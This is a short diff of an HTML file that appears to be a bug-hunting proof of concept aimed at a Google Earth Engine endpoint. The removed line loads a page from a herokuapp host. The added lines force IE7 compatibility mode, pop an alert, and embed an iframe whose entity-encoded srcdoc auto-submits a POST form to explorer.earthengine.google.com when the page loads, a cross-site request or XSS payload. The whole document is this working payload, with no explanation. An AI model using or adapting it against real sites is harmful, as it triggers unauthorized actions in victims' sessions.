@@ -1,1 +1,4 @@
-<iframe id=x src="https://bughunt1307.herokuapp.com/googlexss.html"></iframe> <script>x.location.reload()</script>
+<meta http-equiv="X-UA-Compatible" content="IE=7" >
+<script>alert(document.documentMode)</script>
+<iframe id=x src="#" srcdoc="&#x3C;body onload=&#x22;document.getElementById(&#x27;xss&#x27;).submit();&#x22;&#x3E;&#x3C;form  id=&#x22;xss&#x22; action=&#x22;https://explorer.earthengine.google.com/getProject&#x22; method=&#x22;POST&#x22;&#x3E;&#x3C;/form&#x3E;&#x3C;/body&#x3E;
+"></iframe>
